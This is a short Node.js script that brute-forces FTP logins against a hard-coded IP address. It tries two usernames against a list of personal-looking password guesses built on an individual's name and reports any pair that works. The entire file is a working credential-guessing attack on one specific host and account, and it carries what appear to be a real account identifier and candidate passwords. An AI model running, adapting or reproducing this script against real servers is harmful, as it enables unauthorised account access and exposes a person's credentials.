const net = require('net');

const FTP_HOST = '31.220.110.252';

const usernames = [
    'u959866192',
    'u959866192.Wasay98'
];

const passwords = [
    'Wasay123@#$',
    'Wasay786',
    'Wasay123',
    'Wasay98',
    'Wasay786@#$',
    'Wasay123@',
    'abdulwasay',
    'abdulwasay786'
];

function tryLogin(username, password) {
    return new Promise((resolve) => {
        const socket = net.createConnection(21, FTP_HOST);
        socket.setTimeout(5000);
        let step = 0;

        socket.on('data', (data) => {
            const res = data.toString();
            // console.log(`[${username}:${password}] Step ${step}: ${res.trim()}`);
            if (step === 0) {
                step = 1;
                socket.write(`USER ${username}\r\n`);
            } else if (step === 1) {
                if (res.includes('331')) {
                    step = 2;
                    socket.write(`PASS ${password}\r\n`);
                } else {
                    socket.end();
                    resolve(false);
                }
            } else if (step === 2) {
                socket.end();
                if (res.includes('230') || res.includes('202')) {
                    resolve(true);
                } else {
                    resolve(false);
                }
            }
        });

        socket.on('error', () => {
            socket.end();
            resolve(false);
        });

        socket.on('timeout', () => {
            socket.end();
            resolve(false);
        });
    });
}

async function main() {
    console.log('Testing FTP combinations...');
    for (const u of usernames) {
        for (const p of passwords) {
            console.log(`Trying ${u} with password ${p}...`);
            const success = await tryLogin(u, p);
            if (success) {
                console.log(`\n🎉 SUCCESS! Working Credentials:`);
                console.log(`Username: ${u}`);
                console.log(`Password: ${p}`);
                return;
            }
        }
    }
    console.log('\n❌ No working credentials found.');
}

main();
